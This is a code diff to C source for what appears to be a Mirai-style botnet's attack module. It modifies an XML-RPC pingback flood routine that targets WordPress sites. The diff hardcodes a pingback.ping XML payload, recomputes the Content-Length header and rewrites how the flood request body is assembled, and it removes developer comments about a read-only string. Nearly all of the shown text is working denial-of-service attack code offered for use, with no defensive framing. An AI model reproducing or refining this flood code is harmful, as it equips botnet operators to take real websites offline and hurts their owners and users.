@@ -19,9 +19,7 @@
 
 void attack_app_proxy(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-
 }
-
 
 void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
@@ -1658,7 +1656,7 @@ void attack_app_XMLRPC(uint8_t targs_len, struct attack_target *targs, uint8_t o
 {
     int i, ii, rfd, ret = 0;
     struct attack_http_state *http_table = NULL;
-    char *postdata = attack_get_opt_str(opts_len, opts, ATK_OPT_POST_DATA, NULL);
+    char *postdata = "<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>DHuxQHSdxTFppejFHFAZtMWOMcWNLCLkDQduiLWZSIvaLVxhWbbNAAFqeFrGDxDG</string></value></param><param><value><string>NcTnaibCWwwlOxhSjIWtrRLuSjxeisWwUqjvZLxvfthWgOoPXLJOcVIvFGZnzejT</string></value></param></params></methodCall>";
     char *method = attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, "POST");
     char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
     char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/");
@@ -1679,9 +1677,7 @@ void attack_app_XMLRPC(uint8_t targs_len, struct attack_target *targs, uint8_t o
     if (util_strlen(method) > 9)
         return;
 
-    // BUT BRAH WHAT IF METHOD IS THE DEFAULT VALUE WONT IT SEGFAULT CAUSE READ ONLY STRING?
-    // yes it would segfault but we only update the values if they are not already uppercase.
-    // if the method is lowercase and its passed from the CNC we can update that memory no problem
+   
     for (ii = 0; ii < util_strlen(method); ii++)
         if (method[ii] >= 'a' && method[ii] <= 'z')
             method[ii] -= 32;
@@ -1810,12 +1806,6 @@ void attack_app_XMLRPC(uint8_t targs_len, struct attack_target *targs, uint8_t o
                 char buf[10240];
                 util_zero(buf, 10240);
 
-                char str1[64];
-                char str2[64];
-
-                rand_str2(str1, 64);
-                rand_str2(str2, 64);
-
                 util_strcpy(buf + util_strlen(buf), "POST");
                 util_strcpy(buf + util_strlen(buf), " ");
                 util_strcpy(buf + util_strlen(buf), conn->path);
@@ -1840,26 +1830,20 @@ void attack_app_XMLRPC(uint8_t targs_len, struct attack_target *targs, uint8_t o
                 table_lock_val(TABLE_ATK_ACCEPT_LNG);
 
                 util_strcpy(buf + util_strlen(buf), "\r\n");
-                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL));
-                util_strcpy(buf + util_strlen(buf), "345");
-
-                util_strcpy(buf + util_strlen(buf), "\r\n");
                 util_strcpy(buf + util_strlen(buf), "X-Requested-With: XMLHttpRequest");
                 util_strcpy(buf + util_strlen(buf), "\r\n");
 
-                table_unlock_val(TABLE_ATK_CONTENT_TYPE_XML);
-                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_TYPE_XML, NULL));
-                table_lock_val(TABLE_ATK_CONTENT_TYPE_XML);
-
-                util_strcpy(buf + util_strlen(buf), "\r\n\r\n<?xml version='1.0' encoding='iso-8859-1'?>");
-                util_strcpy(buf + util_strlen(buf), "<methodCall><methodName>pingback.ping</methodName>");
-                util_strcpy(buf + util_strlen(buf), "<params><param><value><string>");
-                util_strcpy(buf + util_strlen(buf), str1);
-                util_strcpy(buf + util_strlen(buf), "</string></value>");
-                util_strcpy(buf + util_strlen(buf), "</param><param><value><string>");
-                util_strcpy(buf + util_strlen(buf), str2);
-                util_strcpy(buf + util_strlen(buf), "</string>");
-                util_strcpy(buf + util_strlen(buf), "</value></param></params></methodCall>");
+                if (postdata != NULL)
+                {
+                    table_unlock_val(TABLE_ATK_CONTENT_TYPE_XML);
+                    util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_TYPE_XML, NULL));
+                    table_lock_val(TABLE_ATK_CONTENT_TYPE_XML);
+                    util_strcpy(buf + util_strlen(buf), "\r\n");
+                    util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL));
+                    util_strcpy(buf + util_strlen(buf), " ");
+                    util_itoa(util_strlen(postdata), 10, buf + util_strlen(buf));
+                    util_strcpy(buf + util_strlen(buf), "\r\n");
+                }
 
                 if (conn->num_cookies > 0)
                 {
@@ -1875,17 +1859,7 @@ void attack_app_XMLRPC(uint8_t targs_len, struct attack_target *targs, uint8_t o
                 util_strcpy(buf + util_strlen(buf), "\r\n");
 
                 if (postdata != NULL)
-                {
-                    util_strcpy(buf + util_strlen(buf), "\r\n\r\n<?xml version='1.0' encoding='iso-8859-1'?>");
-                    util_strcpy(buf + util_strlen(buf), "<methodCall><methodName>pingback.ping</methodName>");
-                    util_strcpy(buf + util_strlen(buf), "<params><param><value><string>");
-                    util_strcpy(buf + util_strlen(buf), str1);
-                    util_strcpy(buf + util_strlen(buf), "</string></value>");
-                    util_strcpy(buf + util_strlen(buf), "</param><param><value><string>");
-                    util_strcpy(buf + util_strlen(buf), str2);
-                    util_strcpy(buf + util_strlen(buf), "</string>");
-                    util_strcpy(buf + util_strlen(buf), "</value></param></params></methodCall>");
-                }
+                    util_strcpy(buf + util_strlen(buf), postdata);
 
                 if (!util_strcmp(conn->method, conn->orig_method))
                     util_strcpy(conn->method, conn->orig_method);
